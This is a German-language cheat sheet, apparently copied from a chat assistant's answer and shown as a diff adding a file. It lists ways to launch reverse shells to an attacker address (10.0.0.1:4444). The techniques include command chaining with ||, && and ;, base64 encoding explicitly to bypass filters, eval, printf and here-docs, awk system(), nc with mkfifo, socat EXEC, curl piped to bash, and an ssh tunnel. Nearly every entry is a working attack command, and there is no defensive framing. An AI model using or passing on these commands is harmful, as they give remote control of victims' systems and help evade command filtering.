@@ -1,0 +1,89 @@
+1. Befehle mit || oder && erzwingen
+Idee: Nutze die Logik der Shell, um Befehle nur unter bestimmten Bedingungen auszuführen.
+Beispiele:
+|| (OR): Der zweite Befehl wird nur ausgeführt, wenn der erste fehlschlägt.
+bash
+
+Copy
+falscher_befehl || bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+&& (AND): Der zweite Befehl wird nur ausgeführt, wenn der erste erfolgreich ist.
+bash
+
+Copy
+echo "Test" && bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+2. Befehle mit ; trennen
+Idee: Nutze ;, um mehrere Befehle in einer Zeile auszuführen, unabhängig vom Erfolg des vorherigen Befehls.
+Beispiel:
+bash
+
+Copy
+echo "Start"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+3. Tunneling durch echo und Pipe
+Idee: Leite den Reverse-Shell-Befehl über echo an eine andere Shell weiter.
+Beispiele:
+Einfaches Pipe:
+bash
+
+Copy
+echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | bash
+Mit base64-Encoding (um Filter zu umgehen):
+bash
+
+Copy
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash
+4. Befehle in Variablen speichern
+Idee: Nutze Shell-Variablen, um den Reverse-Shell-Befehl zu verstecken.
+Beispiel:
+bash
+
+Copy
+cmd="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"; eval "$cmd"
+5. Verwendung von printf oder cat
+Idee: Nutze alternative Befehle wie printf oder cat, um den Befehl zu konstruieren.
+Beispiele:
+Mit printf:
+bash
+
+Copy
+printf 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' | bash
+Mit cat und Here-Doc:
+bash
+
+Copy
+cat <<EOF | bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+EOF
+6. Verwendung von awk oder sed
+Idee: Nutze Textverarbeitungstools, um den Befehl zu generieren.
+Beispiel:
+bash
+
+Copy
+echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | awk '{system($0)}'
+7. Verwendung von nc oder socat mit Metazeichen
+Idee: Nutze Netzwerk-Tools wie nc oder socat in Kombination mit Shell-Metazeichen.
+Beispiele:
+Mit nc:
+bash
+
+Copy
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+Mit socat:
+bash
+
+Copy
+socat TCP:10.0.0.1:4444 EXEC:bash
+8. Verwendung von curl oder wget
+Idee: Lade ein Skript von einem entfernten Server herunter und führe es aus.
+Beispiel:
+bash
+
+Copy
+curl http://10.0.0.1/shell.sh | bash
+9. Verwendung von ssh für Reverse Shells
+Idee: Nutze SSH, um eine Reverse Shell aufzubauen.
+Beispiel:
+bash
+
+Copy
+ssh -R 4444:localhost:22 user@10.0.0.1
